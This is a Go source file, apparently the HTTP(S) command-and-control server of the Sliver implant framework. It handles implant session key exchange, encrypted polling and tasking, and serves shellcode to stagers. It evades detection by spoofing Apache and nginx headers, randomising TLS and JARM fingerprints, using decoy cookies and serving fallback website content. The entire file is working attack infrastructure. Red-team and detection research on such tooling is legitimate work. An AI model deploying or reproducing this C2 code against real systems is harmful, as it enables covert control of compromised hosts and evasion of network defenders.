package c2

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"bytes"
	"context"
	"crypto/rand"
	"crypto/tls"
	"encoding/hex"
	"errors"
	"fmt"
	"io"
	insecureRand "math/rand"
	"net"
	"net/http"
	"net/url"
	"path/filepath"
	"strconv"
	"sync"
	"time"
	"unicode"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/server/certs"
	"github.com/bishopfox/sliver/server/configs"
	"github.com/bishopfox/sliver/server/core"
	"github.com/bishopfox/sliver/server/cryptography"
	"github.com/bishopfox/sliver/server/db"
	sliverHandlers "github.com/bishopfox/sliver/server/handlers"
	"github.com/bishopfox/sliver/server/log"
	"github.com/bishopfox/sliver/server/website"
	"github.com/bishopfox/sliver/util"
	"github.com/bishopfox/sliver/util/encoders"

	"github.com/gorilla/mux"
	"google.golang.org/protobuf/proto"
)

var (
	httpLog   = log.NamedLogger("c2", "http")
	accessLog = log.NamedLogger("c2", "http-access")

	ErrMissingNonce   = errors.New("nonce not found in request")
	ErrMissingOTP     = errors.New("otp code not found in request")
	ErrInvalidEncoder = errors.New("invalid request encoder")
	ErrDecodeFailed   = errors.New("failed to decode request")
	ErrDecryptFailed  = errors.New("failed to decrypt request")
)

const (
	DefaultMaxBodyLength   = 2 * 1024 * 1024 * 1024 // 2Gb
	DefaultHTTPTimeout     = time.Minute
	DefaultLongPollTimeout = time.Second
	DefaultLongPollJitter  = time.Second
	minPollTimeout         = time.Second
)

var (
	serverVersionHeader string
)

// HTTPSession - Holds data related to a sliver c2 session
type HTTPSession struct {
	ID          string
	ImplantConn *core.ImplantConnection
	CipherCtx   *cryptography.CipherContext
	Started     time.Time
}

// HTTPSessions - All currently open HTTP sessions
type HTTPSessions struct {
	active map[string]*HTTPSession
	mutex  *sync.RWMutex
}

// Add - Add an HTTP session
func (s *HTTPSessions) Add(session *HTTPSession) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	s.active[session.ID] = session
}

// Get - Get an HTTP session
func (s *HTTPSessions) Get(sessionID string) *HTTPSession {
	s.mutex.RLock()
	defer s.mutex.RUnlock()
	return s.active[sessionID]
}

// Remove - Remove an HTTP session
func (s *HTTPSessions) Remove(sessionID string) {
	s.mutex.Lock()
	defer s.mutex.Unlock()
	delete(s.active, sessionID)
}

// HTTPHandler - Path mapped to a handler function
type HTTPHandler func(resp http.ResponseWriter, req *http.Request)

// HTTPServerConfig - Config data for servers
type HTTPServerConfig struct {
	Addr    string
	LPort   uint16
	Domain  string
	Website string
	Secure  bool
	Cert    []byte
	Key     []byte
	ACME    bool

	MaxRequestLength int

	EnforceOTP      bool
	LongPollTimeout time.Duration
	LongPollJitter  time.Duration
	RandomizeJARM   bool
}

// SliverHTTPC2 - Holds refs to all the C2 objects
type SliverHTTPC2 struct {
	HTTPServer   *http.Server
	ServerConf   *HTTPServerConfig // Server config (user args)
	HTTPSessions *HTTPSessions
	SliverStage  []byte // Sliver shellcode to serve during staging process
	Cleanup      func()

	c2Config *configs.HTTPC2Config // C2 config (from config file)
}

func (s *SliverHTTPC2) getServerHeader() string {
	if serverVersionHeader == "" {
		switch insecureRand.Intn(2) {
		case 0:
			serverVersionHeader = fmt.Sprintf("Apache/2.4.%d (Unix)", insecureRand.Intn(48))
		default:
			serverVersionHeader = fmt.Sprintf("nginx/1.%d.%d (Ubuntu)", insecureRand.Intn(21), insecureRand.Intn(8))
		}
	}
	return serverVersionHeader
}

func (s *SliverHTTPC2) getCookieName() string {
	cookies := configs.GetHTTPC2Config().ServerConfig.Cookies
	index := insecureRand.Intn(len(cookies))
	return cookies[index]
}

func (s *SliverHTTPC2) LoadC2Config() *configs.HTTPC2Config {
	if s.c2Config != nil {
		return s.c2Config
	}
	s.c2Config = configs.GetHTTPC2Config()
	return s.c2Config
}

// StartHTTPListener - Start an HTTP(S) listener, this can be used to start both
//
//	HTTP/HTTPS depending on the caller's conf
//
// TODO: Better error handling, configurable ACME host/port
func StartHTTPListener(conf *HTTPServerConfig) (*SliverHTTPC2, error) {
	httpLog.Infof("Starting https listener on '%s'", conf.Addr)
	server := &SliverHTTPC2{
		ServerConf: conf,
		HTTPSessions: &HTTPSessions{
			active: map[string]*HTTPSession{},
			mutex:  &sync.RWMutex{},
		},
	}
	server.HTTPServer = &http.Server{
		Addr:         conf.Addr,
		Handler:      server.router(),
		WriteTimeout: DefaultHTTPTimeout,
		ReadTimeout:  DefaultHTTPTimeout,
		IdleTimeout:  DefaultHTTPTimeout,
		TLSNextProto: make(map[string]func(*http.Server, *tls.Conn, http.Handler)),
	}
	if conf.ACME {
		conf.Domain = filepath.Base(conf.Domain) // I don't think we need this, but we do it anyways
		httpLog.Infof("Attempting to fetch let's encrypt certificate for '%s' ...", conf.Domain)
		acmeManager := certs.GetACMEManager(conf.Domain)
		acmeHTTPServer := &http.Server{Addr: ":80", Handler: acmeManager.HTTPHandler(nil)}
		go acmeHTTPServer.ListenAndServe()
		server.HTTPServer.TLSConfig = &tls.Config{
			GetCertificate: acmeManager.GetCertificate,
		}
		server.Cleanup = func() {
			ctx, cancelHTTP := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTP()
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warnf("Failed to shutdown http acme server")
			}
			ctx, cancelHTTPS := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancelHTTPS()
			server.HTTPServer.Shutdown(ctx)
			if err := acmeHTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warn("Failed to shutdown https server")
			}
		}
	} else {
		server.HTTPServer.TLSConfig = getHTTPSConfig(conf)
		server.Cleanup = func() {
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()
			server.HTTPServer.Shutdown(ctx)
			if err := server.HTTPServer.Shutdown(ctx); err != nil {
				httpLog.Warn("Failed to shutdown https server")
			}
		}
	}

	return server, nil
}

func getHTTPSConfig(conf *HTTPServerConfig) *tls.Config {
	if conf.Cert == nil || conf.Key == nil {
		var err error
		if conf.Domain != "" {
			conf.Cert, conf.Key, err = certs.HTTPSGenerateRSACertificate(conf.Domain)
		} else {
			conf.Cert, conf.Key, err = certs.HTTPSGenerateRSACertificate("localhost")
		}
		if err != nil {
			httpLog.Errorf("Failed to generate self-signed tls cert/key pair %s", err)
			return nil
		}
	}
	cert, err := tls.X509KeyPair(conf.Cert, conf.Key)
	if err != nil {
		httpLog.Errorf("Failed to parse tls cert/key pair %s", err)
		return nil
	}

	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}}
	if !conf.RandomizeJARM {
		return tlsConfig
	}

	// Randomize the JARM fingerprint
	switch insecureRand.Intn(4) {

	// So it turns out that Windows by default
	// disables TLS v1.2 because it's horrible.
	// So anyways for compatibility we'll specify
	// a min of 1.1 or 1.0

	case 0:
		// tlsConfig.MinVersion = tls.VersionTLS13
		fallthrough // For compatibility with winhttp
	case 1:
		// tlsConfig.MinVersion = tls.VersionTLS12
		fallthrough // For compatibility with winhttp
	case 2:
		tlsConfig.MinVersion = tls.VersionTLS11
	default:
		tlsConfig.MinVersion = tls.VersionTLS10
	}

	// Randomize the cipher suites
	allCipherSuites := []uint16{
		tls.TLS_RSA_WITH_RC4_128_SHA,                      //uint16 = 0x0005 1
		tls.TLS_RSA_WITH_3DES_EDE_CBC_SHA,                 //uint16 = 0x000a 2
		tls.TLS_RSA_WITH_AES_128_CBC_SHA,                  //uint16 = 0x002f 3
		tls.TLS_RSA_WITH_AES_256_CBC_SHA,                  //uint16 = 0x0035 4
		tls.TLS_RSA_WITH_AES_128_CBC_SHA256,               //uint16 = 0x003c 5
		tls.TLS_RSA_WITH_AES_128_GCM_SHA256,               //uint16 = 0x009c 6
		tls.TLS_RSA_WITH_AES_256_GCM_SHA384,               //uint16 = 0x009d 7
		tls.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA,              //uint16 = 0xc007 8
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,          //uint16 = 0xc009 9
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,          //uint16 = 0xc00a 10
		tls.TLS_ECDHE_RSA_WITH_RC4_128_SHA,                //uint16 = 0xc011 11
		tls.TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA,           //uint16 = 0xc012 12
		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,            //uint16 = 0xc013 13
		tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,            //uint16 = 0xc014 14
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256,       //uint16 = 0xc023 15
		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,         //uint16 = 0xc027 16
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,         //uint16 = 0xc02f 17
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,       //uint16 = 0xc02b 18
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,         //uint16 = 0xc030 19
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,       //uint16 = 0xc02c 20
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256,   //uint16 = 0xcca8 21
		tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256, //uint16 = 0xcca9 22
	}
	// CipherSuites ignores the order of the ciphers, this random shuffle
	// is truncated resulting in a random selection from all ciphers
	insecureRand.Shuffle(len(allCipherSuites), func(i, j int) {
		allCipherSuites[i], allCipherSuites[j] = allCipherSuites[j], allCipherSuites[i]
	})
	nCiphers := insecureRand.Intn(len(allCipherSuites)-8) + 8
	tlsConfig.CipherSuites = allCipherSuites[:nCiphers]

	// Some TLS 1.2 stacks disable some of the older ciphers like RC4, so to ensure
	// compatibility we need to make sure we always choose at least one modern RSA
	// option.
	modernCiphers := []uint16{
		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256,       //uint16 = 0xc027 16
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,       //uint16 = 0xc02f 17
		tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,       //uint16 = 0xc030 19
		tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256, //uint16 = 0xcca8 21
	}

	found := false
	for _, cipher := range tlsConfig.CipherSuites {
		if util.Contains(modernCiphers, cipher) {
			found = true // Our random selection contains a modern cipher, do nothing
			break
		}
	}
	if !found {
		// We are lacking at least one modern RSA option, so randomly enable one
		tlsConfig.CipherSuites = append(tlsConfig.CipherSuites, modernCiphers[insecureRand.Intn(len(modernCiphers))])
	}

	if certs.TLSKeyLogger != nil {
		tlsConfig.KeyLogWriter = certs.TLSKeyLogger
	}
	return tlsConfig
}

func (s *SliverHTTPC2) router() *mux.Router {
	router := mux.NewRouter()
	c2Config := s.LoadC2Config()
	if s.ServerConf.MaxRequestLength < 1024 {
		s.ServerConf.MaxRequestLength = DefaultMaxBodyLength
	}
	if s.ServerConf.LongPollTimeout == 0 {
		s.ServerConf.LongPollTimeout = DefaultLongPollTimeout
		s.ServerConf.LongPollJitter = DefaultLongPollJitter
	}

	httpLog.Debugf("HTTP C2 Implant Config = %v", c2Config.ImplantConfig)
	httpLog.Debugf("HTTP C2 Server Config = %v", c2Config.ServerConfig)

	// Start Session Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.StartSessionFileExt),
		s.startSessionHandler,
	).MatcherFunc(s.filterOTP).MatcherFunc(s.filterNonce).Methods(http.MethodGet, http.MethodPost)

	// Session Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.SessionFileExt),
		s.sessionHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet, http.MethodPost)

	// Poll Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.PollFileExt),
		s.pollHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet)

	// Close Handler
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s$}", c2Config.ImplantConfig.CloseFileExt),
		s.closeHandler,
	).MatcherFunc(s.filterNonce).Methods(http.MethodGet)

	// Can't force the user agent on the stager payload
	// Request from msf stager payload will look like:
	// GET /fonts/Inter-Medium.woff/B64_ENCODED_PAYLOAD_UUID
	router.HandleFunc(
		fmt.Sprintf("/{rpath:.*\\.%s[/]{0,1}.*$}", c2Config.ImplantConfig.StagerFileExt),
		s.stagerHandler,
	).MatcherFunc(s.filterOTP).Methods(http.MethodGet)

	// Default handler returns static content or 404s
	httpLog.Debugf("No pattern matches for request uri")
	router.HandleFunc("/{rpath:.*}", s.defaultHandler).Methods(http.MethodGet, http.MethodPost)

	router.Use(loggingMiddleware)
	router.Use(s.DefaultRespHeaders)

	return router
}

func (s *SliverHTTPC2) noCacheHeader(resp http.ResponseWriter) {
	resp.Header().Add("Cache-Control", "no-store, no-cache, must-revalidate")
}

// This filters requests that do not have a valid nonce
func (s *SliverHTTPC2) filterNonce(req *http.Request, rm *mux.RouteMatch) bool {
	nonce, err := getNonceFromURL(req.URL)
	if err != nil {
		httpLog.Warnf("Invalid nonce '%d'", nonce)
		return false // NaN
	}
	return true
}

func (s *SliverHTTPC2) filterOTP(req *http.Request, rm *mux.RouteMatch) bool {
	if s.ServerConf.EnforceOTP {
		httpLog.Debug("Checking for valid OTP code ...")
		otpCode, err := getOTPFromURL(req.URL)
		if err != nil {
			httpLog.Warnf("Failed to validate OTP: %s", err)
			return false
		}
		valid, err := cryptography.ValidateTOTP(otpCode)
		if err != nil {
			httpLog.Warnf("Failed to validate OTP: %s", err)
			return false
		}
		if valid {
			httpLog.Debug("OTP code is valid")
			return true
		}
		httpLog.Debugf("OTP code (%s) is invalid", otpCode)
		return false
	} else {
		httpLog.Debug("OTP enforcement is disabled")
		return true // OTP enforcement is disabled
	}
}

func getNonceFromURL(reqURL *url.URL) (int, error) {
	qNonce := ""
	for arg, values := range reqURL.Query() {
		if len(arg) == 1 {
			qNonce = digitsOnly(values[0])
			break
		}
	}
	if qNonce == "" {
		httpLog.Warn("Nonce not found in request")
		return 0, ErrMissingNonce
	}
	nonce, err := strconv.Atoi(qNonce)
	if err != nil {
		httpLog.Warnf("Invalid nonce, failed to parse '%s'", qNonce)
		return 0, err
	}
	_, _, err = encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Invalid nonce (%s)", err)
		return 0, err
	}
	return nonce, nil
}

func getOTPFromURL(reqURL *url.URL) (string, error) {
	otpCode := ""
	for arg, values := range reqURL.Query() {
		if len(arg) == 2 {
			otpCode = digitsOnly(values[0])
			break
		}
	}
	if otpCode == "" {
		httpLog.Warn("OTP not found in request")
		return "", ErrMissingNonce
	}
	return otpCode, nil
}

func digitsOnly(value string) string {
	var buf bytes.Buffer
	for _, char := range value {
		if unicode.IsDigit(char) {
			buf.WriteRune(char)
		}
	}
	return buf.String()
}

func loggingMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		accessLog.Infof("%s - %s - %v", getRemoteAddr(req), req.RequestURI, req.Header.Get("User-Agent"))
		next.ServeHTTP(resp, req)
	})
}

// DefaultRespHeaders - Configures default response headers
func (s *SliverHTTPC2) DefaultRespHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(resp http.ResponseWriter, req *http.Request) {
		if s.c2Config.ServerConfig.RandomVersionHeaders {
			resp.Header().Set("Server", s.getServerHeader())
		}
		for _, header := range s.c2Config.ServerConfig.Headers {
			if 0 < header.Probability && header.Probability < 100 {
				roll := insecureRand.Intn(99) + 1
				if header.Probability < roll {
					continue
				}
			}
			resp.Header().Set(header.Name, header.Value)
		}
		next.ServeHTTP(resp, req)
	})
}

func (s *SliverHTTPC2) websiteContentHandler(resp http.ResponseWriter, req *http.Request) error {
	httpLog.Infof("Request for site %v -> %s", s.ServerConf.Website, req.RequestURI)
	contentType, content, err := website.GetContent(s.ServerConf.Website, req.RequestURI)
	if err != nil {
		httpLog.Infof("No website content for %s", req.RequestURI)
		return err
	}
	resp.Header().Set("Content-type", contentType)
	s.noCacheHeader(resp)
	resp.Write(content)
	return nil
}

func (s *SliverHTTPC2) defaultHandler(resp http.ResponseWriter, req *http.Request) {
	// Request does not match the C2 profile so we pass it to the static content or 404 handler
	if s.ServerConf.Website != "" {
		httpLog.Infof("Serving static content from website %v", s.ServerConf.Website)
		err := s.websiteContentHandler(resp, req)
		if err == nil {
			return
		}
	}
	httpLog.Debugf("[404] No match for %s", req.RequestURI)
	resp.WriteHeader(http.StatusNotFound)
}

// [ HTTP Handlers ] ---------------------------------------------------------------

func (s *SliverHTTPC2) startSessionHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Start http session request")
	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
		s.defaultHandler(resp, req)
		return
	}
	body, err := io.ReadAll(req.Body)
	if err != nil {
		httpLog.Errorf("Failed to read body %s", err)
		s.defaultHandler(resp, req)
		return
	}
	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Errorf("Failed to decode body %s", err)
		s.defaultHandler(resp, req)
		return
	}
	if len(data) < 32 {
		httpLog.Warn("Invalid data length")
		s.defaultHandler(resp, req)
		return
	}

	var publicKeyDigest [32]byte
	copy(publicKeyDigest[:], data[:32])
	implantConfig, err := db.ImplantConfigByECCPublicKeyDigest(publicKeyDigest)
	if err != nil || implantConfig == nil {
		httpLog.Warn("Unknown public key")
		s.defaultHandler(resp, req)
		return
	}

	serverKeyPair := cryptography.ECCServerKeyPair()
	sessionInitData, err := cryptography.AgeKeyExFromImplant(
		serverKeyPair.Private,
		implantConfig.ECCPrivateKey,
		data[32:],
	)
	if err != nil {
		httpLog.Error("ECC decryption failed")
		s.defaultHandler(resp, req)
		return
	}
	sessionInit := &sliverpb.HTTPSessionInit{}
	err = proto.Unmarshal(sessionInitData, sessionInit)
	if err != nil {
		httpLog.Error("Failed to decode session init")
		return
	}

	httpSession := newHTTPSession()
	sKey, err := cryptography.KeyFromBytes(sessionInit.Key)
	if err != nil {
		httpLog.Error("Failed to convert bytes to session key")
		return
	}
	httpSession.CipherCtx = cryptography.NewCipherContext(sKey)
	httpSession.ImplantConn = core.NewImplantConnection("http(s)", getRemoteAddr(req))
	s.HTTPSessions.Add(httpSession)
	httpLog.Infof("Started new session with http session id: %s", httpSession.ID)

	responseCiphertext, err := httpSession.CipherCtx.Encrypt([]byte(httpSession.ID))
	if err != nil {
		httpLog.Info("Failed to encrypt session identifier")
		s.defaultHandler(resp, req)
		return
	}
	http.SetCookie(resp, &http.Cookie{
		Domain:   s.ServerConf.Domain,
		Name:     s.getCookieName(),
		Value:    httpSession.ID,
		Secure:   false,
		HttpOnly: true,
	})
	s.noCacheHeader(resp)
	resp.Write(encoder.Encode(responseCiphertext))
}

func (s *SliverHTTPC2) sessionHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Session request")
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		s.defaultHandler(resp, req)
		return
	}
	httpSession.ImplantConn.UpdateLastMessage()

	plaintext, err := s.readReqBody(httpSession, resp, req)
	if err != nil {
		httpLog.Warnf("Failed to decode request body: %s", err)
		s.defaultHandler(resp, req)
		return
	}
	envelope := &sliverpb.Envelope{}
	err = proto.Unmarshal(plaintext, envelope)
	if err != nil {
		httpLog.Warnf("Failed to decode request body: %s", err)
		s.defaultHandler(resp, req)
		return
	}

	resp.WriteHeader(http.StatusAccepted)
	handlers := sliverHandlers.GetHandlers()
	if envelope.ID != 0 {
		httpSession.ImplantConn.RespMutex.RLock()
		defer httpSession.ImplantConn.RespMutex.RUnlock()
		if resp, ok := httpSession.ImplantConn.Resp[envelope.ID]; ok {
			resp <- envelope
		}
	} else if handler, ok := handlers[envelope.Type]; ok {
		respEnvelope := handler(httpSession.ImplantConn, envelope.Data)
		if respEnvelope != nil {
			go func() {
				httpSession.ImplantConn.Send <- respEnvelope
			}()
		}
	}
}

func (s *SliverHTTPC2) pollHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Poll request")
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		s.defaultHandler(resp, req)
		return
	}
	httpSession.ImplantConn.UpdateLastMessage()

	// We already know we have a valid nonce because of the middleware filter
	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, _ := encoders.EncoderFromNonce(nonce)
	select {
	case envelope := <-httpSession.ImplantConn.Send:
		resp.WriteHeader(http.StatusOK)
		envelopeData, _ := proto.Marshal(envelope)
		ciphertext, err := httpSession.CipherCtx.Encrypt(envelopeData)
		if err != nil {
			httpLog.Errorf("Failed to encrypt message %s", err)
			ciphertext = []byte{}
		}
		s.noCacheHeader(resp)
		resp.Write(encoder.Encode(ciphertext))
	case <-req.Context().Done():
		httpLog.Debug("Poll client hang up")
		return
	case <-time.After(s.getServerPollTimeout()):
		httpLog.Debug("Poll time out")
		resp.WriteHeader(http.StatusNoContent)
		s.noCacheHeader(resp)
		resp.Write([]byte{})
	}
}

func (s *SliverHTTPC2) readReqBody(httpSession *HTTPSession, resp http.ResponseWriter, req *http.Request) ([]byte, error) {
	nonce, _ := getNonceFromURL(req.URL)
	_, encoder, err := encoders.EncoderFromNonce(nonce)
	if err != nil {
		httpLog.Warnf("Request specified an invalid encoder (%d)", nonce)
		s.defaultHandler(resp, req)
		return nil, ErrInvalidEncoder
	}

	body, err := io.ReadAll(&io.LimitedReader{
		R: req.Body,
		N: int64(s.ServerConf.MaxRequestLength),
	})
	if err != nil {
		httpLog.Warnf("Failed to read request body %s", err)
		return nil, err
	}

	data, err := encoder.Decode(body)
	if err != nil {
		httpLog.Warnf("Failed to decode body %s", err)
		s.defaultHandler(resp, req)
		return nil, ErrDecodeFailed
	}
	plaintext, err := httpSession.CipherCtx.Decrypt(data)
	if err != nil {
		httpLog.Warnf("Decryption failure %s", err)
		s.defaultHandler(resp, req)
		return nil, ErrDecryptFailed
	}
	return plaintext, err
}

func (s *SliverHTTPC2) getServerPollTimeout() time.Duration {
	min := s.ServerConf.LongPollTimeout
	max := s.ServerConf.LongPollTimeout + s.ServerConf.LongPollJitter
	timeout := float64(min) + insecureRand.Float64()*(float64(max)-float64(min))
	pollTimeout := time.Duration(int64(timeout))
	if pollTimeout < minPollTimeout {
		httpLog.Warnf("Poll timeout is too short, using default minimum %v", minPollTimeout)
		pollTimeout = minPollTimeout
	}
	httpLog.Debugf("Poll timeout: %s", pollTimeout)
	return pollTimeout
}

func (s *SliverHTTPC2) closeHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Close request")
	httpSession := s.getHTTPSession(req)
	if httpSession == nil {
		httpLog.Infof("No session with id %#v", httpSession.ID)
		s.defaultHandler(resp, req)
		return
	}
	for _, cookie := range req.Cookies() {
		cookie.MaxAge = -1
		http.SetCookie(resp, cookie)
	}
	s.HTTPSessions.Remove(httpSession.ID)
	resp.WriteHeader(http.StatusAccepted)
}

// stagerHandler - Serves the sliver shellcode to the stager requesting it
func (s *SliverHTTPC2) stagerHandler(resp http.ResponseWriter, req *http.Request) {
	httpLog.Debug("Stager request")
	if len(s.SliverStage) != 0 {
		httpLog.Infof("Received staging request from %s", getRemoteAddr(req))
		s.noCacheHeader(resp)
		resp.Write(s.SliverStage)
		httpLog.Infof("Serving sliver shellcode (size %d) to %s", len(s.SliverStage), getRemoteAddr(req))
		resp.WriteHeader(http.StatusOK)
	} else {
		resp.WriteHeader(http.StatusNotFound)
	}
}

func (s *SliverHTTPC2) getHTTPSession(req *http.Request) *HTTPSession {
	for _, cookie := range req.Cookies() {
		httpSession := s.HTTPSessions.Get(cookie.Value)
		if httpSession != nil {
			httpSession.ImplantConn.UpdateLastMessage()
			return httpSession
		}
	}
	return nil // No valid cookie names
}

func newHTTPSession() *HTTPSession {
	return &HTTPSession{
		ID:      newHTTPSessionID(),
		Started: time.Now(),
	}
}

// newHTTPSessionID - Get a 128bit session ID
func newHTTPSessionID() string {
	buf := make([]byte, 16)
	rand.Read(buf)
	return hex.EncodeToString(buf)
}

func getRemoteAddr(req *http.Request) string {
	ipAddress := req.Header.Get("X-Real-Ip")
	if ipAddress == "" {
		ipAddress = req.Header.Get("X-Forwarded-For")
	}
	if ipAddress == "" {
		return req.RemoteAddr
	}

	// Try to parse the header as an IP address, as this is user controllable
	// input we don't want to trust it.
	ip := net.ParseIP(ipAddress)
	if ip == nil {
		httpLog.Warn("Failed to parse X-Header as ip address")
		return req.RemoteAddr
	}
	return fmt.Sprintf("tcp(%s)->%s", req.RemoteAddr, ip.String())
}
